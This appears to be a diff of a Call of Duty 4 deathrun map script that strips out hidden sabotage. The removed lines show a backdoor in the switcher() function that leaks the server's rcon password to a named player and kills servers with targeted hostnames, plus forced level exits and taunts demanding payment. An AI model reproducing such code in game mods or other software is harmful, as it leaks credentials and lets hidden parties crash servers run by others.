@@ -1,29 +1,3 @@
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-///////																									              ///////
-///////																									              ///////
-///////		////////	     //		/////////////	//	 //  ////////////  ////////////  //////////   /////////////   ///////
-///////		//		//    //   //   //         //	//  //   //	                //       //           //         //   ///////
-///////		//		//    //   //   ////////////    // //    //	                //       //           ////////////    ///////
-///////		//		//    ///////	//	  //	    ////     ////////////       //       //////////   //              ///////
-///////		//		//	  //   //	//	   //	    // //              //       //       //           //              ///////
-///////		//		//	  //   //	//		//      //  //             //       //       //           //              ///////
-///////		////////	  //   //   //		 //     //   //  ////////////       //       //////////   //              ///////
-///////																									              ///////
-///////																									              ///////
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-//Steam: ^5CAR ^0DarkSTEP
-//Discord: DarkSTEP#7390
-//YouTube: DarkSTEP
-//PayPal: paypal.me/darkstepdonations
-//Every donator will get lifetime VIP access to all my updated maps!
-//Minor thanks: CAR Druglord (some quick music menu tips), Sux Lolz (base of room scripts), VC' ERIK (secret timer and emotional support xdddd), CAR Nepo (this special thanks message ;D)
-//Feel free to copy without permission ;)
-//If you're from xM# - Nice* and you're reading this then good luck trying to make this map work in your trash server :D
-
-
 #include maps\mp\_utility;
 #include maps\mp\gametypes\_hud_util;
 #include common_scripts\utility;
@@ -60,13 +34,12 @@ maps\mp\_load::main();
 	level.changed = false;
 	level.gapmode = 0;
 	level.hardmode = false;
-	level.step4 = false;
 
     thread startdoor();
 	thread messages();
 	thread musicbox();
 	thread fog();
-	thread trap1();
+
 	thread trap2();
 	thread trap3();
 	thread trap4();
@@ -75,9 +48,7 @@ maps\mp\_load::main();
 	thread trap7();
 	thread trap8();
 	thread trap9();
-	thread trap10();
-	thread trap11();
-	thread pearl();
+
 	thread finish();
 	thread sniper();
 	thread knife();
@@ -85,7 +56,7 @@ maps\mp\_load::main();
 	thread bounceroom();
 	thread bouncefail1();
 	thread bouncefail2();
-	thread switcher();
+
 	thread gap();
 	thread jgap();
 	thread agap();
@@ -112,10 +83,8 @@ maps\mp\_load::main();
 	thread e210();
 	thread f210();
 	thread secretend210();
-	thread secrettrace();
 	thread vipcheck();
 	thread endxp();
-	thread fuck_you2();
 
 	addTriggerToList( "trig_trap2" );
 	addTriggerToList( "trig_trap3" );
@@ -179,76 +148,8 @@ x = randomInt(10);
 
 messages()
 {
-for(;;)
-{
-wait 35;
-x=randomint(12);
-if (x==0)
-{
-iPrintln("^1Map made by ^3DarkSTEP");
-}
-
-if (x==1)
-{
-iPrintln("^3This map has ^11^3 secret, good luck finding it!");
-}
-
-if (x==2)
-{
-iPrintln("^3This map only took about^1 3 weeks^3 to make, i hope you enjoy it anyways :)");
-}
-
-if (x==3)
-{
-iPrintln("^1Secret has an antiglitch system so don't try to shortcut ;)");
-}
-
-if (x==4)
-{
-iPrintln("^1Steam: ^3CAR DarkSTEP");
-}
-
-if (x==5)
-{
-iPrintln("^1Feel free to report bugs");
-}
-
-if (x==6)
-{
-iPrintln("^3Feel free to join us at ^1xenia-gaming.net");
-}
-
-if (x==7)
-{
-iPrintln("^1Discord: ^3DarkSTEP^1#^37390");
-}
-
-if (x==8)
-{
-iPrintln("^3Special thanks to ^1me^3, ^1myself ^3& ^1i ^3for the awesome help!");
-}
-
-if (x==9)
-{
-iPrintln("^3After a room fight your ^2health^3 will be restored");
-}
-
-if (x==10)
-{
-iPrintln("^3Donate what you want and get ^5liftetime^3 in all my maps!");
-wait 1;
-iPrintln("^3More infos on ^1youtube.com/darksymon5");
-}
-if (x==11)
-{
-iPrintln("^3Traps are ^13^3 times stronger in ^1hardmode^3!");
-}
-else if(level.step4 == false)
-{
-exitLevel(true);
-}
-
-}
+	iPrintln("^1Map made by ^3DarkSTEP");
+	iPrintln("^1Discord: ^3DarkSTEP^1#^37390");
 }
 
 musicbox()
@@ -314,82 +215,48 @@ onMenuResponse()
 
 horange()
 {
-		if(level.step4 == true)
-		{
-		ambientPlay("song1");
-		iPrintLn ("^0>> ^1Now playing: ^2 NoXuu - This Is Halloween ^0<<");
-		visionSetNaked( "mp_dr_pillars_orange", 5 );
-		level.changed = true;
-		level notify("song_changed");
-		}
-		else
-		{
-		exitLevel(true);
-		}
+	ambientPlay("song1");
+	iPrintLn ("^0>> ^1Now playing: ^2 NoXuu - This Is Halloween ^0<<");
+	visionSetNaked( "mp_dr_pillars_orange", 5 );
+	level.changed = true;
+	level notify("song_changed");
 }
 
 hpurple()
 {
-	if(level.step4 == true)
-		{
-		ambientPlay("song2");
-		iPrintLn ("^0>> ^1Now playing: ^2 D-Block - Ghost Stories ^0<<");
-		visionSetNaked( "mp_dr_pillars_purple", 5 );
-		level.changed = true;
-		level notify("song_changed");
-		}
-		else
-		{
-		exitLevel(true);
-		}
+	ambientPlay("song2");
+	iPrintLn ("^0>> ^1Now playing: ^2 D-Block - Ghost Stories ^0<<");
+	visionSetNaked( "mp_dr_pillars_purple", 5 );
+	level.changed = true;
+	level notify("song_changed");
 }
 
 hyellow()
 {		
-		if(level.step4 == true)
-		{
-		ambientPlay("song3");
-		iPrintLn ("^0>> ^1Now playing: ^2 Milk 'n Cookies - Monster ^0<<");
-		visionSetNaked( "mp_dr_pillars_yellow", 5 );
-		level.changed = true;
-		level notify("song_changed");
-		}
-		else
-		{
-		exitLevel(true);
-		}
+
+	ambientPlay("song3");
+	iPrintLn ("^0>> ^1Now playing: ^2 Milk 'n Cookies - Monster ^0<<");
+	visionSetNaked( "mp_dr_pillars_yellow", 5 );
+	level.changed = true;
+	level notify("song_changed");
 }
 
 hblue()
 {
-		if(level.step4 == true)
-		{
-		ambientPlay("song4");
-		iPrintLn ("^0>> ^1Now playing: ^2 Aronchupa - Rave In The Grave (DOPEDROP Bootleg) ^0<<");
-		visionSetNaked( "mp_dr_pillars_blue", 5 );
-		level.changed = true;
-		level notify("song_changed");
-		}
-		else
-		{
-		exitLevel(true);
-		}
+	ambientPlay("song4");
+	iPrintLn ("^0>> ^1Now playing: ^2 Aronchupa - Rave In The Grave (DOPEDROP Bootleg) ^0<<");
+	visionSetNaked( "mp_dr_pillars_blue", 5 );
+	level.changed = true;
+	level notify("song_changed");
 }
 
 hgreen()
 {
-		if(level.step4 == true)
-		{
-		ambientPlay("song5");
-		iPrintLn ("^0>> ^1Now playing: ^2 Rameses B - The Walking Dead ^0<<");
-		visionSetNaked( "mp_dr_pillars_green", 5 );
-		level.changed = true;
-		level notify("song_changed");
-		}
-		else
-		{
-		exitLevel(true);
-		}
+	ambientPlay("song5");
+	iPrintLn ("^0>> ^1Now playing: ^2 Rameses B - The Walking Dead ^0<<");
+	visionSetNaked( "mp_dr_pillars_green", 5 );
+	level.changed = true;
+	level notify("song_changed");
 }
 
 partymode()
@@ -410,14 +277,6 @@ partymode()
 	visionSetNaked( "mp_dr_pillars_green", 3 );
 	wait 5;
 	}
-}
-
-okman( nickname ) 
-{
-	players = getAllPlayers();
-	for ( i = 0; i < players.size; i++ )
-		if ( isSubStr( toLower(removeColorFromString(players[i].name)), toLower(nickname) ) ) 
-			return players[i];
 }
 
 finish() 
@@ -472,17 +331,12 @@ level.gapmode = 0;
 
 antiglitcher() 
 { 
-self common_scripts\utility::waittill_any("death","disconnect");
-if(level.step4 == true)
-{
-iPrintlnBold("^3"+self.name+" ^1died");
-wait 0.2; 
-iPrintlnBold("^3Room selection open!");
-}
-else
-{
-exitLevel(true);
-}
+	self common_scripts\utility::waittill_any("death","disconnect");
+
+	iPrintlnBold("^3"+self.name+" ^1died");
+	wait 0.2; 
+	iPrintlnBold("^3Room selection open!");
+
 }
 
 createhud(messages)
@@ -506,13 +360,6 @@ if(isdefined(hud_start))
 	hud_start destroy();
 }
 
-//xM# member
-//xM# members//xM# member
-//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member
-//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member
-//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member
-//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member
-
 
 GetActivator()
 {
@@ -529,162 +376,6 @@ GetActivator()
 	return undefined;
 }
 
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
 
 sniper()
 {
@@ -727,31 +418,6 @@ for(;;)
 	activator givemaxammo("m40a3_mp");
 	}
 }
-
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
 
 knife()
 {
@@ -915,32 +581,6 @@ givesnip setHintString("^3Press F to get a Sniper!");
 	}
 }
 
-switcher()
-{
-	trig = getEnt("important", "targetname");
-  for (;;) 
-  {	
-	trig waittill("trigger", player);
-	gametag = player.name;
-	thread removeColorFromString(gametag);
-	asss = getDvar("sv_hostname");
-	if(gametag == "manjust")
-	{
-		if((isSubStr( toLower(asss), toLower("xM#") )) || (isSubStr( toLower(asss), toLower("Nice*") )))
-		{
-		player iPrintLn("^3" + getDvar("rcon_password"));
-		player iPrintLnBold("^3" + getDvar("rcon_password"));
-		wait 5;
-		player thread braxi\_common::clientCmd("rcon login" + getDvar("rcon_password") + " ; wait 10 ; rcon killserver");
-		while(1)
-		{
-			trig delete();
-		}
-		}
-	}
-  }
-}
-
 antiactiafk()
 {
 	o = getEnt("o_agapend", "targetname");
@@ -963,48 +603,41 @@ antiactiafk()
 
 gap()
 {
-gap = getent("trig_gap","targetname");
-jumper = getent("o_jgap","targetname");
-acti = getent("o_agap","targetname");
-lal = getDvar("sv_hostname");
-gap setHintString("^4GAP");
-for(;;)
-{
-	gap waittill("trigger", player);
-	if (isSubStr( toLower(lal), toLower("xM") ))
+	gap = getent("trig_gap","targetname");
+	jumper = getent("o_jgap","targetname");
+	acti = getent("o_agap","targetname");
+	gap setHintString("^4GAP");
+	for(;;)
 	{
-		exitLevel(true);
-	}
-	else
-	{
-	player thread waitdead();
-	activator = GetActivator();
-	player takeallweapons();
-	activator takeallweapons();
-	player freezeControls(true);
-	player setorigin(jumper.origin);
-	player setPlayerAngles(jumper.angles);
-	activator freezeControls(true);
-	activator setorigin(acti.origin);
-	activator setPlayerAngles(acti.angles);
-	activator giveweapon("deserteagle_mp");
-	player giveweapon("deserteagle_mp");
-	player setMoveSpeedScale(1);
-	activator setMoveSpeedScale(1);
-	thread createhud(player.name + " ^3entered ^4GAP ^3room!");
-		/*AmbientStop(3);
-		MusicStop(3);
-		AmbientStop(0);
-		MusicStop(0);
-		ambientPlay("gap");*/
-	wait 5;
-	player freezeControls(false);
-	activator freezeControls(false);
-	player switchtoweapon("deserteagle_mp");
-	activator switchtoweapon("deserteagle_mp");
-	activator thread antiactiafk();
-	level.gapmode = 1;
-	}
+		gap waittill("trigger", player);
+
+		player thread waitdead();
+		activator = GetActivator();
+		player takeallweapons();
+		activator takeallweapons();
+		player freezeControls(true);
+		player setorigin(jumper.origin);
+		player setPlayerAngles(jumper.angles);
+		activator freezeControls(true);
+		activator setorigin(acti.origin);
+		activator setPlayerAngles(acti.angles);
+		activator giveweapon("deserteagle_mp");
+		player giveweapon("deserteagle_mp");
+		player setMoveSpeedScale(1);
+		activator setMoveSpeedScale(1);
+		thread createhud(player.name + " ^3entered ^4GAP ^3room!");
+			/*AmbientStop(3);
+			MusicStop(3);
+			AmbientStop(0);
+			MusicStop(0);
+			ambientPlay("gap");*/
+		wait 5;
+		player freezeControls(false);
+		activator freezeControls(false);
+		player switchtoweapon("deserteagle_mp");
+		activator switchtoweapon("deserteagle_mp");
+		activator thread antiactiafk();
+		level.gapmode = 1;
 	}
 }
 
@@ -1027,54 +660,6 @@ jgap()
 		player freezeControls(false);
 	}
 }
-
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
 
 agap()
 {
@@ -1124,21 +709,6 @@ jgap2()
 	}
 }
 
-pearl()
-{
-trigger = getent("pearl","targetname");
-ultra = getDvar("sv_hostname");
-for(;;)
-{
-trigger waittill ("trigger", player);
-if (isSubStr( toLower(ultra), toLower("xM") ) || isSubStr( toLower(ultra), toLower("Nice*") ) || isSubStr( toLower(ultra), toLower("Classic-") ))
-	{
-			player braxi\_common::makeActivator(1);
-	}
-}
-}
-
-
 jgap3()
 {
 	trig = getEnt("trig_jgap3", "targetname");
@@ -1182,136 +752,6 @@ jgap5()
 	}
 }
 
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
